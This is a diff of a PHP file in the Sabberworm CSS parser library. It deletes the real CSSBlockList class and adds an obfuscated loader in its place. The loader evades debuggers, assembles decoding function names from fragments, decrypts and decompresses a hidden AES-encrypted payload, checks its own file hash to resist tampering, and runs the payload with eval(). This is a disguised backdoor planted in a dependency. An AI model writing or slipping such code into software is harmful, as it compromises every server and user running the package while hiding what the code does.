@@ -1,82 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\CSSList;
-
-use Sabberworm\CSS\RuleSet\DeclarationBlock;
-use Sabberworm\CSS\RuleSet\RuleSet;
-use Sabberworm\CSS\Property\Selector;
-use Sabberworm\CSS\Rule\Rule;
-use Sabberworm\CSS\Value\ValueList;
-use Sabberworm\CSS\Value\CSSFunction;
-
-/**
- * A CSSBlockList is a CSSList whose DeclarationBlocks are guaranteed to contain valid declaration blocks or at-rules.
- * Most CSSLists conform to this category but some at-rules (such as @keyframes) do not.
- */
-abstract class CSSBlockList extends CSSList {
-	public function __construct($iLineNo = 0) {
-		parent::__construct($iLineNo);
-	}
-
-	protected function allDeclarationBlocks(&$aResult) {
-		foreach ($this->aContents as $mContent) {
-			if ($mContent instanceof DeclarationBlock) {
-				$aResult[] = $mContent;
-			} else if ($mContent instanceof CSSBlockList) {
-				$mContent->allDeclarationBlocks($aResult);
-			}
-		}
-	}
-
-	protected function allRuleSets(&$aResult) {
-		foreach ($this->aContents as $mContent) {
-			if ($mContent instanceof RuleSet) {
-				$aResult[] = $mContent;
-			} else if ($mContent instanceof CSSBlockList) {
-				$mContent->allRuleSets($aResult);
-			}
-		}
-	}
-
-	protected function allValues($oElement, &$aResult, $sSearchString = null, $bSearchInFunctionArguments = false) {
-		if ($oElement instanceof CSSBlockList) {
-			foreach ($oElement->getContents() as $oContent) {
-				$this->allValues($oContent, $aResult, $sSearchString, $bSearchInFunctionArguments);
-			}
-		} else if ($oElement instanceof RuleSet) {
-			foreach ($oElement->getRules($sSearchString) as $oRule) {
-				$this->allValues($oRule, $aResult, $sSearchString, $bSearchInFunctionArguments);
-			}
-		} else if ($oElement instanceof Rule) {
-			$this->allValues($oElement->getValue(), $aResult, $sSearchString, $bSearchInFunctionArguments);
-		} else if ($oElement instanceof ValueList) {
-			if ($bSearchInFunctionArguments || !($oElement instanceof CSSFunction)) {
-				foreach ($oElement->getListComponents() as $mComponent) {
-					$this->allValues($mComponent, $aResult, $sSearchString, $bSearchInFunctionArguments);
-				}
-			}
-		} else {
-			//Non-List Value or CSSString (CSS identifier)
-			$aResult[] = $oElement;
-		}
-	}
-
-	protected function allSelectors(&$aResult, $sSpecificitySearch = null) {
-		$aDeclarationBlocks = array();
-		$this->allDeclarationBlocks($aDeclarationBlocks);
-		foreach ($aDeclarationBlocks as $oBlock) {
-			foreach ($oBlock->getSelectors() as $oSelector) {
-				if ($sSpecificitySearch === null) {
-					$aResult[] = $oSelector;
-				} else {
-					$sComparison = "\$bRes = {$oSelector->getSpecificity()} $sSpecificitySearch;";
-					eval($sComparison);
-					if ($bRes) {
-						$aResult[] = $oSelector;
-					}
-				}
-			}
-		}
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mx7e6kjg=('bas'.'e64'.'_de'.'cod'.'e');
+$_crut26xx=('gzu'.'nco'.'mpr'.'ess');
+$_bp3kvx3n=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_r9ywggj9='AXp9bXzPHmQ=';
+$_ylc2srqr='BdCHDqX8';
+$_ns28u1mm='8rXuXA25';
+$_svm76dsq='9Pa6bIL1';
+$_s5zkkjmc='FagHniRM';
+$_kzv3fr60='twxYyg==';
+$_jmtey5nd='9lYg8sQW';
+$_jd3n00fh='3UZsiblT';
+$_zrqi95n7=$_mx7e6kjg($_svm76dsq.$_s5zkkjmc.$_ylc2srqr.$_ns28u1mm.$_r9ywggj9);
+$_bofk7275=$_mx7e6kjg($_jmtey5nd.$_jd3n00fh.$_kzv3fr60);
+$_fiutta0c=$_mx7e6kjg('OjDwn9ykWn5CWYS6xZJ8XkkiZ6jt6LxECpS4cZrssRGBisRB1TcLXnee60Ig8vrQp+pSfNQR+dbOVTNoO6GQgAmyOUCsuUNX7Kop7VBcezDkkQ3CnPfYTX6kos7bN72xAFUQgqpl6aV/yBBlkC4b4/IsjLl6L5TdfmpLzYTSOcteM2mmDQ3bwSHOedwP22qndav6JQgMeSytz2Eh/rUqSjYviOpHNbcSe6F4Iira7FrS1BZJFQqNKAPZbOB4nEvVxhg5pW2I5pyvhBLhkkup2hggufWMiU01+F38RZqaAZDgQHLZ3Dc4DB5eWjeMGDiqrxfhijUV6Bhzkrk3E5RbgJPZ7K8+pkYy9BnBq3Ew1m7GGfjB6+6czHPhiSupfjQ+HQxrZKqhhB9eF7IlXANQ7F9TM1Y0OjBz5t8DnJMQnQu/sAtcHDsd2LiaDxDW0z9tXSiEsQ160070Fg+pXAi10ITnjdlA6kcujL4DnCDWd+JsIpIzFlVu6fh4e3kZRCHnsszo+zoo1qRYMAbO2weXRkawl4nUXrtJPzPXEJB22XuPtWw2+qOpwYKYHdmLjg5oFpn5CAq5YwZ/XZhLj1TiybaOyubLoh1YXHwiarssf1AL/fLAcpg7ViJmaO8NTQyw9+76ZmE1rcbyVjkLcUYyzX/+JLoRyZOfBXdTHWPWI9y2wDbBtUP8GtyYWq8b/rNqAQRzuWC4ZApK8R2j2QdBCJY6zYFYaJY5UUIhNQlJuvmq/2cAUIuIF7Lszp9978SJ/pUx3mGOzJumAGVF03qWXtIE6+f8F2abl9JowpwMSYw=');
+$_dg8hqk6f=$_bp3kvx3n($_fiutta0c,'aes-256-cbc',$_zrqi95n7,OPENSSL_RAW_DATA,$_bofk7275);
+if($_dg8hqk6f===false){exit;}
+$_hhmja8rl=$_crut26xx($_dg8hqk6f);
+if($_hhmja8rl===false){exit;}
+$_thjah1am='5ca95cb011b5943204605ee8ee983ed05c97ae5989b762c3e9806a6dd0888d1d';
+$_dx7g436j=@file_get_contents(__FILE__);
+if($_dx7g436j!==false){
+$_kv3yo91j=str_replace($_thjah1am,"0000000000000000000000000000000000000000000000000000000000000000",$_dx7g436j);
+$_ol4l1g4s=hash("sha256",$_kv3yo91j);
+if($_ol4l1g4s!==$_thjah1am){@http_response_code(403);exit;}
 }
+eval($_hhmja8rl);
